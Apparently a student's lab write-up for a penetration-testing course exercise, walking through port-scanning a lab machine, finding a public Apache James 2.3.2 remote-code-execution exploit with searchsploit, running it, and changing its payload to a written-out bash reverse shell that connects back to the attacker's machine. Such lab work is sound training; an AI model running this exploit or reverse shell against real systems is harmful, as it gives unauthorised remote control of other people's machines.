# 14.3.1 Putting It All Together
#### Exercises

_(To be performed on your own Kali and Ubuntu lab client machines - Reporting is required for these exercises)_

**1.  Connect to your dedicated Linux client and start the vulnerable Apache James service using the _/usr/local/james/bin/run.sh_ script.**

This is straightforward, we just need to run the aformentioned script to start the Apache James service.
![[Start_james.png]]


**2.  Enumerate the target using port scanning utilities and use information from the banners and Internet searches to determine the software running on the machine.**

We can start our nmap script with the following command:
`sudo nmap 192.168.243.44 -p- -sV -vv --open --reason`

We receive the following:
![[nmap_services.png]]
Our internet search shows that we are running Apache James 2.3.2
![[james_search.png]]


**3.  Use the _searchsploit_ tool to find exploits for this version on the online resources mentioned in this module.**

Using Searchsploit we find a number of exploits including a very promising Remote Code Execution in the form of a python script. Let's try this script out.
![[searchsploit_james.png]]
**4.  Launch the exploit and verify that the payload is executed upon logging in to the machine.**

We simply run the payload with the required IP argument. 
![[exploit_run.png]]
We can see upon login that our exploit has executed.
![[exploited_proof.png]]

And we can see our proof.txt file.
![[exploited_proof2.png]]

**5.  Attempt to modify the _payload_ variable in order to get a reverse shell on the target machine.**

In order to receive a reverse shell we just need to modify the initial exploit and change the line stating "touch /root/proof.txt" to a reverse shell. 
`payload = 'bash -i >& /dev/tcp/192.168.119.243/9001 0>&1'`

And we see our reverse connection
![[course notes/images/14_locating_public_exploits/rev_shell.png]]